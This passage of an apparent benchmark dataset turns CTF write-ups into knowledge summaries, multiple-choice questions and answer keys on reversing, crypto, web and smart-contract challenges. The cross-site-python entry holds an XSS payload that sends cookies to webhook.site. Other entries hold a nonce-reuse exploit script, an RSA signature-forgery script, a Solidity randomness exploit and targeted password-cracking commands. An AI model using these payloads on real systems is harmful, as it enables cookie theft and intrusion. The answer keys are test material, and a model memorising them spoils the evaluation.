            "In a program that utilizes the `boost::mt19937` pseudo-random number generator, after seeding the generator with a value less than or equal to 111 and discarding a certain number of values, the next generated number must match a predefined constant. Considering the importance of the generator's state after the copy and discard operations, which operation is critical for ensuring the predicted number matches `3570126595`?  - A. Discarding `num * num` random values before copying the state of the random engine. - B. Using the generated number immediately after seeding without discarding any values. - C. Discarding `num / 12` random values after copying the state of the random engine. - D. Re-seeding the generator with a new value before each discard operation. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "CPP",
        "write_up": "dataset/raw/CPP.md",
        "type": "reverse",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 75,
        "max_score": 233123.2321,
        "difficulty": 0.00032171825744003145,
        "knowledge": [
            "When given a CTF challenge involving a complex program, especially one that involves recursive inclusion, symbolic execution can be very useful. Symbolic execution refers to analyzing a program to determine what inputs cause each part of a program to execute. If a direct approach to understanding or running the program is infeasible (due to obfuscation, size, or complexity), manually reverse-engineering critical parts of the logic and then simulating or re-implementing this logic in a more tractable environment like Python can lead to success. This approach is particularly effective when the program logic includes conditional compilation, self-inclusion, or manipulates variables in a predictable but non-obvious manner.",
            "When dealing with obfuscated programs that implement algorithmic checks (like checking a flag against a hardcoded value) through preprocessor directives, macros, or other compile-time evaluations, reduce the problem to its mathematical or logical essence. In scenarios where the program's logic performs operations like bitwise manipulation, arithmetic operations, or lookups from a hardcoded data structure (like a ROM in the presented challenge), this logic can often be extracted and implemented in constraint-solving frameworks such as Z3. This allows for automated solving of conditions required to reach a desired state (e.g., a \"valid flag\" message) without manually tracing through the obfuscated or convoluted original source code."
        ],
        "question": [
            "In the context of analyzing a CTF challenge with a deeply nested and obfuscated C program that relies on conditional compilation and recursive inclusion, which technique is most suitable for unraveling the program's logic for further analysis? - A. Decompiling the C program to assembly and analyzing the instructions. - B. Symbolic execution to determine inputs that cause specific branches of the program to execute. - C. Executing the program with a variety of test inputs to observe behavior. - D. Using a code beautifier to format the source code for better readability.",
            "While working on a CTF challenge that involves an obfuscated C program performing checks on a flag using compile-time evaluations, how can the underlying logic best be analyzed and solved? - A. Rewriting the logic in Java to understand the algorithmic flow. - B. Manually executing each branch of the program to determine the correct flag. - C. Transcribing the program's logic into a constraint-solving framework such as Z3 to automatically solve for the flag. - D. Ignoring the obfuscated parts and focusing only on standard C library calls for clues."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Crack-a-Mateo",
        "write_up": "dataset/raw/Crack-a-Mateo.md",
        "type": "crypto",
        "competition": [
            "JerseyCTF/2024",
            "https://ctftime.org/event/2230/tasks/"
        ],
        "score": 493,
        "max_score": 1000,
        "difficulty": 0.493,
        "knowledge": [
            "When faced with a challenge that requires cracking a password, and personal information about the target is available, one can utilize specialized password-generating tools like CUPP (Common User Passwords Profiler) to create a tailored dictionary. This approach leverages personal information (e.g., names, birthdates, keywords related to the victim) to generate a comprehensive list of possible passwords, improving the efficiency of the attack by focusing on likely password combinations.",
            "For cracking encrypted files (like a PDF in the provided example) with known password hashes, using John the Ripper with a custom wordlist generated through methods described in point 1 is an effective strategy. This approach combines the strengths of a personalized attack dictionary with the powerful cracking capabilities of John the Ripper, allowing for the decryption of files protected by passwords that could be guessed from the victim's personal information.\n   \n   Example command: `john --wordlist=mateo.txt pdf.hash`"
        ],
        "question": [
            "When attempting to generate a tailored dictionary for cracking passwords using personal information about the target, which of the following details is not typically useful in CUPP (Common User Passwords Profiler) to enhance the dictionary's effectiveness? - A. The target's favorite color - B. The target's birthdate - C. The target's first name - D. A keyword related to the victim ",
            "In the context of decrypting a PDF file with a known password hash, which command correctly illustrates the use of John the Ripper with a custom wordlist generated from the target's personal information? - A. `john --wordlist=custom.txt pdf.hash` - B. `john --custom=mateo.txt pdf.hash` - C. `john --wordlist=mateo.txt pdf.hash` - D. `john --list=mateo.txt --decrypt=pdf.hash` "
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "Crackme",
        "write_up": "dataset/raw/Crackme.sol.md",
        "type": "web",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When facing a challenge that involves interacting with a smart contract function on the Ethereum blockchain which has unusual parameter conditions, understand that these conditions could often involve typical computation operations with a twist. For example, if a function parameter must satisfy a condition that seems impossible (like a number being both greater than 0 and, when incremented, less than 1), consider integer overflow possibilities. Unsigned integer overflow can be particularly relevant in contracts written in Solidity, as this language uses 256-bit unsigned integers. The maximum value of a 256-bit unsigned integer is \\(2^{256} - 1\\), and adding 1 to this number will cause it to overflow back to 0.",
            "To interact with Ethereum smart contracts from a Python environment, the `web3.py` library can be utilized. This library allows for easy interaction with the Ethereum blockchain. To use it:\n   - Initially, configure a connection to an Ethereum node. This can be done by providing the HTTPProvider with a node URL, which can be obtained from services like Infura.\n   - Utilize the middleware stack provided by `web3.py`, such as `geth_poa_middleware`, to overcome common issues related to Ethereum's Proof of Authority (PoA) networks.\n   - Generate the ABI (Application Binary Interface) of the contract to interface with its functions.\n   - Use the contract address and ABI to create a contract object in Web3.py, then interact with the contract's functions (such as sending transactions or calling view functions).\n   \nSample code snippet for calling a smart contract function:\n```python\nfrom web3 import Web3, HTTPProvider\nfrom web3.middleware import geth_poa_middleware\n\nw3 = Web3(Web3.HTTPProvider('<NODE_URL>')) # Replace <NODE_URL> with your Ethereum node URL\nw3.middleware_onion.inject(geth_poa_middleware, layer=0)\n\ncontract_address = '0xCONTRACT_ADDRESS' # Replace CONTRACT_ADDRESS with the actual address\nabi = '[ABI]' # Replace [ABI] with the actual contract ABI\n\ncontract = w3.eth.contract(address=contract_address, abi=abi)\nresult = contract.functions.gib_flag(100, 'evvixyvj vjm', pow(2, 256) - 1).call()\nprint(result)\n```\nReplace `<NODE_URL>`, `0xCONTRACT_ADDRESS`, and `[ABI]` with the actual values for your scenario. This code demonstrates how to call a contract's function without making a transaction (useful for view/pure functions)."
        ],
        "question": [
            "In a smart contract function where the condition for a uint parameter `arg3` must be `arg3 + 1 < 1`, which concept is primarily being used to satisfy this condition? - A. Integer underflow - B. Floating-point precision - C. Integer overflow - D. Data type casting",
            "Which step is required to interact with an Ethereum smart contract using the `web3.py` library after setting up the connection to an Ethereum node? - A. Instantiating an object with the contract's byte code - B. Directly calling the smart contract function without any setup - C. Creating a contract object using the contract address and ABI - D. Compiling the smart contract's Solidity code in Python"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "CRAPSaaS",
        "write_up": "dataset/raw/CRAPSaaS.md",
        "type": "reverse",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "Vulnerabilities located in the syscall implementations of emulators can often lead to arbitrary read and write conditions. In this scenario, the overflow check for the `read` and `write` syscalls was insufficient, allowing for operations with extremely large size parameters after integer overflow. This could be abused to leak memory or crash the program. To exploit such vulnerabilities, it's crucial to understand the arithmetic and logic behind the checks and how they can be bypassed or manipulated for unintended behavior. A generic payload could involve manipulating parameters such as `r3` and `r4` to trigger an overflow and pass checks unexpectedly.",
            "When exploiting buffer overflow vulnerabilities in emulators or programs using memory access instructions (like `ldr` and `str`), the removal or manipulation of bounds checks can lead to out-of-bounds memory access. This challenge highlights the importance of carefully analyzing changes between versions of a target binary, as the removal of a bounds check for memory access instructions introduced a new vulnerability. This can lead to reading and writing arbitrary memory locations if the addresses can be controlled or predicted. A practical exploitation method involves crafting payloads that manipulate memory addresses to read/write out of the intended bounds, leveraging predictable memory layouts or offsets from `mmap` regions to other critical structures or code in memory (e.g., `libc`)."
        ],
        "question": [
            "In the context of exploiting syscall implementations in emulators, considering an insufficient overflow check for the `read` and `write` syscalls, what kind of parameter manipulation could trigger an unintended large size parameter through integer overflow? - A. Setting both `r3` and `r4` to highly positive values to sum up to a reasonable range. - B. Adjusting `r3` to a negative value and `r4` to a positive value such that their sum bypasses the check. - C. Manipulating `r3` to be a large positive number and `r4` to be a small negative number, resulting in their sum passing the check but causing an overflow when used as a size parameter. - D. Keeping `r3` and `r4` as small positive numbers to avoid triggering any checks.",
            "Within the scenario of a buffer overflow vulnerability exploitation through memory access instructions like `ldr` and `str`, when a bounds check is removed, how does this impact the exploitation process? - A. It prevents any attempt to read or write out of bounds, securing the emulator against such exploits. - B. It has no significant impact since the `ldr` and `str` instructions always check their bounds internally regardless of the external check. - C. The removal of a bounds checking mechanism enables reading and writing beyond the allocated memory range, opening up new avenues for crafting an exploit. - D. It makes the program more efficient by removing unnecessary checks, thus protecting against exploitation attempts."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "CRAPSemu",
        "write_up": "dataset/raw/CRAPSemu.md",
        "type": "reverse",
        "competition": [
            "THCon/2021",
            "https://ctftime.org/event/1381/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "When facing challenges that require input validation bypass or cracking a password, timing side-channel attacks can be a viable initial approach if the validation checks the password character by character. This technique relies on measuring execution time for different input characters, where longer execution times may indicate a correct character due to additional processing. If direct timing measurement is not feasible or accurate due to the environment (e.g., virtual machines), using tools like Intel's Pin for tracking instruction counts could provide a more precise measurement by counting the number of instructions executed for each input character.",
            "For challenges involving encrypted or hidden flags within a program's operation, reversing the program logic is essential. If the flag is dynamically generated or encrypted and never fully appears in plaintext in memory, one must reverse engineer the program's logic to understand how the flag is processed or generated. This could include decrypting an encrypted memory block using known constants or operation patterns identified in the disassembled code. For example, if a program encrypts a correct password in memory and compares it against the user's input by decrypting chunks of the encrypted password using a specific operation (e.g., XOR with a known constant), reversing this operation with the known constant on the stored password chunks can reveal the plaintext password or flag.\n\nSample of decrypted payload (reverse operation):\n```c\n// If encrypted password is stored at 0x1ff and XORed with 0x1337f00d, decrypt like so:\nuint32_t encrypted_password[6]; // Assuming this holds the encrypted password from memory\nuint32_t decrypted_password[6];\nfor (int i = 0; i < 6; i++) {\n    decrypted_password[i] = encrypted_password[i] ^ 0x1337f00d;\n}\n// Convert decrypted_password[] to characters or string as needed.\n```"
        ],
        "question": [
            "In a CTF challenge where a password validation process was suspected to use a time-based side-channel vulnerability, but direct timing mechanisms were inaccurate due to the virtual machine environment, which tool was leveraged for a more precise measurement involving instruction count? - A. Intel's VTune - B. Intel's Pin - C. GDB - D. Valgrind",
            "In the process of reverse engineering a program that encrypted a correct password in memory and compared it against user input by decrypting each chunk with a specific operation, which operation was used to decrypt the encrypted password chunks to find the plaintext password or flag? - A. Subtraction with a random seed - B. Addition with a constant value - C. XOR with a known constant - D. Multiplication with a dynamically generated key"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "crccalc2",
        "write_up": "dataset/raw/crccalc2.md",
        "type": "crypto",
        "competition": [
            "ALLES/2020",
            "https://ctftime.org/event/1091/tasks/"
        ],
        "score": 313,
        "max_score": 500,
        "difficulty": 0.626,
        "knowledge": [
            "CRC (Cyclic Redundancy Check) algorithms are not cryptographically secure because they possess linear properties. Specifically, for any two inputs `x` and `y`, the property `CRC(x\u2295y) \u2295 CRC(0) = CRC(x) \u2295 CRC(y)` holds. This allows one to employ linear algebra techniques, such as setting up systems of equations in matrix form, to solve for unknown inputs given a set of CRC values. This approach is useful in scenarios where one needs to reverse-engineer or guess an input based on its CRC values. The technique is especially applicable when dealing with multiple CRCs of varying bit lengths, where the challenge involves finding an input that matches all given CRCs.",
            "The SageMath (or Sage) programming language can be utilized to perform calculations over GF(2) (Galois Field of two elements, representing binary arithmetic) for solving systems of linear equations derived from CRC calculations. This method involves converting CRC calculations into polynomial operations over GF(2), allowing for efficient manipulation and solving of equations. In practice, this involves defining CRC parameters (polynomials, initial and final XOR values, bit lengths, etc.), encoding the target CRCs into matrix form, and using linear algebra functions to find inputs that satisfy all CRC equations. This is demonstrated in the given Sage script, which automates the process of finding inputs matching a given set of CRC values by setting up and solving a system of linear equations. This approach is beneficial for cryptographic challenges that involve reverse-engineering inputs from their CRCs or when testing the resilience of systems against CRC-based manipulation.\n\nExample application (specific payload generation is abstract and depends on the challenge's target CRC values and expected input length):\n- Define target CRC values and input length.\n- Encode these into a system of linear equations using the mentioned linear properties of CRCs.\n- Use SageMath code similar to the provided script to solve for the unknown input."
        ],
        "question": [
            "Which of the following best explains why CRC algorithms are not suitable for cryptographic security? - A. CRC outputs can easily be decrypted with a common key. - B. The algorithms are too complex for practical encryption purposes. - C. CRCs possess linear properties, allowing inputs to be solved using linear algebra techniques. - D. They are vulnerable to quantum attacks which can easily break their encryption.",
            "In the context of using SageMath for solving CRC-based challenges, what is primarily facilitated by SageMath's operations over GF(2)? - A. Automation of brute-force attacks on encrypted messages. - B. Solving systems of linear equations derived from CRC calculations. - C. Enhancing the cryptographic security of CRC algorithms. - D. Generating cryptographically secure random numbers for encryption."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Crooked Roulette",
        "write_up": "dataset/raw/Crooked Roulette.md",
        "type": "crypto",
        "competition": [
            "KITCTFCTF/2022",
            "https://ctftime.org/event/1810/tasks/"
        ],
        "score": 451,
        "max_score": 500,
        "difficulty": 0.902,
        "knowledge": [
            "In challenges involving RSA signing without padding (Textbook RSA), a blinding attack can be utilized to trick the server into signing a modified version of the original message, which can then be unblinded to produce a valid signature for the original message. This attack exploits the multiplicative property of RSA. Specifically, if a server signs a modified message \\(m' = a^e \\cdot m \\mod n\\), obtaining the signature and then dividing it by \\(a\\) (for which \\(a^e\\) was chosen), yields the signature for the original message \\(m\\).",
            "To execute a blinding attack when the public exponent \\(e\\) is unknown, and only the modulus \\(n\\) is given, one can leverage the special property of \\(-1\\) modulo \\(n\\) (i.e., \\(n-1\\)). This involves asking the server to sign the product of the target message and \\(n-1\\) modulo \\(n\\), which effectively flips the sign of the original signature when \\(d\\) (the private exponent) is odd. This works under RSA because of the equivalence \\(a \\equiv -a \\mod n\\) for any integer \\(a\\), and given that RSA's decryption and encryption operations are inverse operations.\n   \n   Example payload for crafting and unblinding a signature:\n   ```python\n   n = int(input(\"Give me n\"), 16)  \n   result = int(input(\"Give me the result\"), 16)\n\n   # Crafting the blinded message\n   blinded_message = hex(((n-1) * result) % n)  \n   print(f\"Let the server sign this {blinded_message}\")  \n   sig = int(input(\"Signature: \"), 16)\n\n   # Unblinding the signature\n   forged_signature = hex((sig * pow(n-1, -1, n)) % n)  \n   print(f\"Forged signature: {forged_signature}\")  \n   ```"
        ],
        "question": [
            "In the context of RSA without padding, how can an attacker forge a valid signature for a given message \\(m\\) if they are able to trick the server into signing a different message \\(m'\\) using a blinding factor? - A. By sending \\(m' = m^e \\mod n\\) to the server for signing. - B. By choosing \\(m'\\) such that \\(m' = a \\cdot m \\mod n\\), obtaining the signature, and then multiplying it by the multiplicative inverse of \\(a \\mod n\\). - C. By choosing \\(m'\\) such that \\(m' = a^e \\cdot m \\mod n\\), obtaining the signature, and then dividing by \\(a\\). - D. By directly sending \\(m\\) to the server without any modification or blinding factor.",
            "In a scenario where the public exponent \\(e\\) of an RSA key is not known to an attacker, which method can be utilized to perform a blinding attack that allows forging a signature for a message \\(m\\), given only the modulus \\(n\\)? - A. By sending \\(m' = (n+1) \\cdot m \\mod n\\) to the server for signing and using the multiplicative inverse of \\(n+1 \\mod n\\) to unblind the signature. - B. By choosing \\(m' = m^e \\mod n\\) for some guessed \\(e\\), then correcting for any errors by leveraging RSA decryption. - C. By asking the server to sign \\(m' = (n-1) \\cdot m \\mod n\\) and then using \\(m'^d \\equiv (n-1) \\cdot m^d \\mod n\\) to calculate the original message\u2019s signature. - D. By multiplying \\(m\\) by a random number and hoping that the server's processing alters it back to \\(m\\) during signing."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "cross-site-python",
        "write_up": "dataset/raw/cross-site-python.md",
        "type": "web",
        "competition": [
            "KITCTFCTF/2023",
            "https://ctftime.org/event/1965/tasks/"
        ],
        "score": 345,
        "max_score": 1000,
        "difficulty": 0.345,
        "knowledge": [
            "When facing restrictions due to Content-Security-Policy (CSP) that limits JavaScript execution to script sources from 'self' and even if traditional XSS vectors like \"script\", \"img\", or event handlers (e.g., \"onerror\") are filtered out server-side, explore the environment for alternative execution methods such as utilizing web-based Python execution platforms (e.g., PyScript). This approach requires bypassing blacklisted elements by leveraging internal objects or methods that are not explicitly filtered and can interact with the DOM or perform web requests. Example payload for extracting sensitive information through an unfiltered class method in PyScript:\n```python\nbut = dict.__base__.__subclasses__()[363](\"buttons\")\nbut.element.innerHTML = '![](https://webhook.site/YOUR_UNIQUE_ENDPOINT?' + but.element.ownerDocument.cookie + ')'\n```",
            "Utilize external services such as webhook.site to capture data exfiltrated from XSS payloads. This method is particularly useful when direct payload feedback isn't possible within the challenge environment and is a viable strategy for bypassing strong CSP policies when coupled with unconventional XSS vectors that leverage the application's allowed functionalities or overlooked object properties/methods. Preparing a webhook receiver allows the collection of sensitive data (e.g., session cookies) relayed by specially crafted payloads without directly violating CSP rules."
        ],
        "question": [
            "When a web application implements a strict Content-Security-Policy (CSP) that only allows scripts from 'self' and uses 'wasm-unsafe-eval', which of the following strategies can be used to execute a successful Cross-Site Scripting (XSS) attack without directly invoking JavaScript? - A. Utilize an <iframe> tag to load a malicious external website. - B. Leverage PyScript and accessible object methods that can modify the Document Object Model (DOM) or issue web requests, bypassing server-side blacklists. - C. Inject a <style> tag with CSS expressions to perform JavaScript actions. - D. Add an <object> tag pointing to a malicious resource that will execute code.",
            "In a situation where traditional methods of capturing data, such as cookies through Cross-Site Scripting (XSS), are hindered by strong CSP policies and direct feedback mechanisms are not available in the challenge environment, which tool provides an effective way to receive exfiltrated data through specially crafted payloads? - A. Utilizing browser debugging tools to intercept and read responses. - B. Setting up a DNS server to log requests made by the vulnerable application. - C. Creating a Github Gist that captures and displays data sent to it. - D. Using external services like webhook.site to set up a receiver that collects data sent by XSS payloads."
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "CRYMEPLX",
        "write_up": "dataset/raw/CRYMEPLX.md",
        "type": "crypto",
        "competition": [
            "CyberSecurityRumble/2022",
            "https://ctftime.org/event/1665/tasks/"
        ],
        "score": 100,
        "max_score": 960,
        "difficulty": 0.10416666666666667,
        "knowledge": [
            "When encountering a service that uses AES-CTR-128 mode (or any stream cipher mode) for encryption, if the Nonce (Number used once) is reused across different encryptions, one can exploit this by xoring the ciphertext of known input with the ciphertext of the unknown data (e.g., the flag) and the known input itself. This leverages the fact that the keystream (AES(Key, Nonce)) remains the same, allowing for the decryption of the flag if one can control the input and obtain the ciphertext of both the input and the flag.",
            "To perform the exploitation of reused Nonce vulnerabilities in AES-CTR or similar encryption schemes, construct an exploit that sends a user-controlled input to the service, retrieves the encrypted outputs of both the fixed secret (like a flag) and the controlled input, and then xors these ciphertexts with the input. This method directly applies to scenarios where the encryption key and Nonce are not changing between encryption operations.\n    - Example of constructing an exploit in Python using the `pwntools` library:  \n    ```python\n    from pwn import *  \n    import binascii\n\n    p = remote('target.host', port)\n\n    # Receive encrypted flag\n    enc_flag = binascii.unhexlify(p.recvline().strip())  \n    \n    # Send controlled input\n    input = 'A' * len(enc_flag)  \n    p.sendline(input)  \n    \n    # Receive encryption of input\n    enc_input = binascii.unhexlify(p.recvline().strip())  \n\n    # Decrypt flag\n    flag = xor(input.encode(), enc_input, enc_flag)  \n    print(f'Decrypted flag: {flag}')\n    ```"
        ],
        "question": [
            "In AES-CTR mode of operation, why is using a repeating Nonce across different encryption sessions considered a vulnerability? - A. It increases the randomness of the encryption making it harder to decrypt - B. It strengthens the encryption by recycling the encryption parameters for better performance - C. It allows an attacker to decrypt the encryption without the key by xor'ing the ciphertexts of known and unknown inputs, due to the keystream remaining the same - D. It automatically encrypts the data twice making it more secure",
            "When exploiting a reused Nonce vulnerability in AES-CTR encryption, which sequence of steps would correctly recover the encrypted secret (e.g., flag)? - A. Encrypt the user-controlled input with the public key, then xor it with both ciphertexts - B. Send a user-controlled input, retrieve the encrypted outputs of both the secret and the input, and then xor these ciphertexts with the input to decrypt the secret - C. Request the decryption of the controlled input and then hash it together with the encryption of the secret data - D. Directly decrypt the encrypted flag with a brute-force attack on the AES key"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "crypto 01",
        "write_up": "dataset/raw/crypto 01.md",
        "type": "crypto",
        "competition": [
            "WhiteHat/2018/Quals",
            "https://ctftime.org/event/656/tasks/"
        ],
        "score": 380,
        "max_score": 420,
        "difficulty": 0.9047619047619048,
        "knowledge": [
            "In scenarios involving stream ciphers where encryption is based on a key and a static parameter (like timestamp), if the static parameter does not change frequently (as in, it remains constant for a duration), the keystream generated for that period stays constant. This property can be exploited to recover the keystream by XORing a known plaintext message with the corresponding ciphertext. This method requires that the communication leverages a constant parameter (e.g., timestamp) and that both the plaintext message and its length are known.",
            "Knowing how stream ciphers operate, particularly in cases where parameters like timestamps are used for generating keystreams, one can craft and send messages encrypted with previously recovered keystreams. This is feasible even after the encryption key on the server side changes, as long as the parameter (e.g., timestamp) used in the keystream generation remains the same. This methodology allows for encrypted communications to be forged or manipulated without the need to directly crack or bypass the encryption key."
        ],
        "question": [
            "In a communication protocol using the A5/1 stream cipher, if the encryption relies on a static timestamp and a secret key, making the keystream constant for a specific duration, how can one exploit this to recover the keystream?  - A. By changing the server's timestamp directly to match the client's timestamp. - B. **By XORing a known plaintext with its corresponding ciphertext when both are of the same length.** - C. By decrypting the message directly using the static timestamp as the key. - D. By guessing the secret key based on the length of the ciphertext. ",
            "Considering the operation of stream ciphers and the utilization of static parameters like timestamps for keystream generation, how can one continue to send encrypted messages after the server changes its encryption secret key, assuming the static parameter used for keystream generation remains unchanged?  - A. By repeatedly guessing the new secret key until the correct one is found. - B. By requesting the server to revert to the old secret key for compatibility. - C. **By encrypting messages with a previously recovered keystream, as long as the static parameter (e.g., timestamp) remains the same.** - D. By decrypting server messages directly using the static parameter as the decryption key. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "crypto casino",
        "write_up": "dataset/raw/crypto casino.md",
        "type": "crypto",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 487,
        "max_score": 1000,
        "difficulty": 0.487,
        "knowledge": [
            "When interacting with smart contracts on the Ethereum blockchain, especially for tasks that require precise timing like betting in a game, one can determine the expected outcome based on the block number at the time of transaction plus one (since the transaction will be included in the next block). This can be useful in scenarios where the contract's behavior is deterministic and depends on the block number. For this, encoding the current block number plus one along with a known seed, hashing it, and performing bitwise operations (like XOR) can match the contract's expected value to win a bet.\n\n   - Scenario: Determining the outcome of a decentralized casino game where the result depends on the block number.\n   - Knowledge: To predict outcomes dependent on block numbers, encode and hash the seed with the next block number, then apply any bitwise operations as done by the contract to calculate the expected result.\n\n   Example Payload:\n   ```python\n   seed = w3.solidityKeccak(['string'], ['some_known_seed'])\n   next_block_guess = encode_abi_packed(['bytes', 'uint256'], (seed, w3.eth.block_number() + 1))\n   next_block_guess_hashed = w3.solidityKeccak(['bytes'], [next_block_guess])\n   guess = int(next_block_guess_hashed.hex(), 16) ^ 0xSOME_BITWISE_VALUE\n   ```",
            "In solidity contracts that implement PRNG (Pseudo-random number generation) using block properties like `blockhash`, an exploitable flaw occurs if the contract's randomness can be predicted or replicated by an external contract. Creating an external contract to simulate the PRNG function of the target contract (e.g., a casino game) allows one to predict or ensure desired outcomes for probabilistic actions, like betting. \n\n   - Scenario: Exploiting weak randomness in smart contract functions that use `blockhash` for randomness.\n   - Knowledge: To exploit weak PRNG in contracts, replicate the contract's randomness generation logic in an external contract to predict outcomes or revert undesired transactions.\n\n   Example Payload:\n   ```solidity\n   contract Exploit {\n       function _randomNumber() public view returns(uint8) {\n           uint256 ab = uint256(blockhash(block.number - 1));\n           uint256 a = ab & 0xffffffff;\n           uint256 b = (ab >> 32) & 0xffffffff;\n           uint256 x = uint256(blockhash(block.number));\n           return uint8((a * x + b) % 6); // Assuming the random number is used for a 1/6 chance event\n       }\n\n       function exploit(address _casino, uint256 _amount) public {\n           require(_randomNumber() == 0, \"Wait for the next block\");\n           Casino(_casino).bet(_amount);\n       }\n   }\n   ```"
        ],
        "question": [
            "In a decentralized casino game scenario, if you want to predict the outcome that is determined by the block number at the time of your transaction, which of the following steps should you take? - A. Wait for the blockchain to produce 10 more blocks before making a guess. - B. Use the current block number, encode and hash it with a predefined seed, then perform the same bitwise operation as the contract. - C. Randomly choose a number and hope it matches the contract's outcome. - D. Encode a random hash value, then perform a SHA256 hash operation before guessing.",
            "When trying to exploit a smart contract that uses `blockhash` as a component in its pseudo-random number generation (PRNG), which approach is most effective? - A. Increase the gas price of your transaction to prioritize its execution order. - B. Predict the next `blockhash` by calculating it in advance. - C. Create an external contract that replicates the contract's randomness generation logic and uses it to predict outcomes or revert transactions. - D. Use a random number generator outside the blockchain to predict the contract's number generation outcome."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Crypto Crossword",
        "write_up": "dataset/raw/Crypto Crossword.md",
        "type": "crypto",
        "competition": [
            "b01lers/2020",
            "https://ctftime.org/event/974/tasks/"
        ],
        "score": 200,
        "max_score": 300,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "When encountering obfuscated or encoded strings, various decoding techniques should be tested based on the appearance of the string. For instance:\n   - If a string ends in '=', Base64 decoding is likely applicable.\n   - If the string consists of two symbols or looks binary, consider Morse code with appropriate symbol mapping.\n   - For hexadecimal strings, direct conversion to text might yield meaningful information.\n   - Ascii85 encoding should be suspected when encountering strings with a wide range of characters, including punctuation and special characters.\n   - Substitution ciphers, including ROT13, should be applied to strings that maintain sentence structure.",
            "In challenges involving ciphers, clues may not directly indicate the cipher used. External hints or broader research (like referencing external media provided as hints) may be necessary to identify the encryption or encoding method, such as Hill ciphers. \n   - For example, with Hill cipher challenges, once the encoded message is identified, one must construct a matrix based on the challenge's constraints (like a crossword layout) and then map letters to numbers (typically A=0, B=1, ..., Z=25) before proceeding with decryption."
        ],
        "question": [
            "When encountering a string `4261636b77617264733a2074776f20666f722062696e6172792c2074656e20666f7220646563696d616c2c20616e64207369787465656e20666f72206865782e20` in a cybersecurity challenge, which decoding technique should be applied? - A. Base64 decoding - B. ASCII85 decoding - C. Hexadecimal to ASCII conversion - D. Morse code decoding",
            "In the context of deciphering a message encoded with a Hill cipher, given the hint is an external link to an image, which approach is most likely intended to solve the puzzle? - A. The link is irrelevant; focus on brute-forcing the decryption. - B. Convert the image directly into a cipher key using steganography tools. - C. Use the image to identify the type of cipher (e.g., Hill cipher) based on historical or popular associations. - D. Translate the image into ASCII art and use it as the decryption key."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Crypto Party",
        "write_up": "dataset/raw/Crypto Party.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When dealing with obfuscated code in mobile applications, especially for APKs, using an online decompiler can transform the APK into readable Java code. Despite the obfuscation of package and class names, searching for key functionalities related to the application's main features (such as QR code processing in this case) can guide you to potentially vulnerable pieces of code. It is essential to focus on the logic related to specific functionalities to uncover vulnerabilities or understand how the app interacts with external services or APIs.",
            "In scenarios involving cryptographic operations, particularly where data is obfuscated or encrypted with a known key or pattern (e.g., XOR encryption with a static key), reversing the obfuscation or decryption process is possible by re-implementing the cryptographic method. This technique can reveal hidden URLs, special values, or other sensitive data embedded within the application. For example, XORing obfuscated byte arrays with the known key \"android.permission.CAMERA\" can deobfuscate URLs or special QR code values, enabling further exploration or exploitation.\n\nExample Payload for XOR Deobfuscation:\n```python\ndef deobfuscate(s):\n    key = b'android.permission.CAMERA'\n    return bytes([s[i] ^ key[i % len(key)] for i in range(len(s))])\n```\n\nThis payload can deobfuscate data obfuscated with the XOR method using a static key, revealing hidden information for further analysis or exploitation steps in CTF challenges."
        ],
        "question": [
            "In a mobile application reversing challenge, when encountering obfuscated code after decompiling an APK, you identify a portion of code responsible for handling QR code processing. Given the complex and obfuscated nature of the rest of the application, which approach is most effective in identifying potential vulnerabilities or crucial features within this section? - A. Analyze every line of code in every obfuscated class for hidden vulnerabilities. - B. Focus on the QR code processing logic to understand how the app interacts with external services or APIs. - C. Ignore the obfuscated code entirely and focus on rebuilding the app from scratch. - D. Only review the app's manifest file and resources without delving into the decompiled code. ",
            "In a challenge involving extracting information from an Android application that uses XOR for obfuscation, you come across a byte array obfuscated with the key \"android.permission.CAMERA\". Which Python snippet would correctly deobfuscate the byte array to reveal hidden URLs or special values? - A. ```python def deobfuscate(s): key = b'android.permission.CAMERA' return ''.join([chr(char ^ ord(key[i % len(key)])) for i, char in enumerate(s)]) ``` - B. ```python def deobfuscate(s): key = b'1234567890abcdef' return bytes([s[i] ^ key[i % len(key)] for i in range(len(s))]) ``` - C. ```python def deobfuscate(s): key = b'android.permission.CAMERA' return bytes([s[i] ^ key[i] for i in range(len(s))]) ``` - D. ```python def deobfuscate(s): key = b'android.permission.CAMERA' return bytes([s[i] ^ key[i % len(key)] for i in range(len(s))]) ``` "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Crypto PHP",
        "write_up": "dataset/raw/Crypto PHP.md",
        "type": "crypto",
        "competition": [
            "RaziCTF/2020",
            "https://ctftime.org/event/1167/tasks/"
        ],
        "score": 990,
        "max_score": 996,
        "difficulty": 0.9939759036144579,
        "knowledge": [
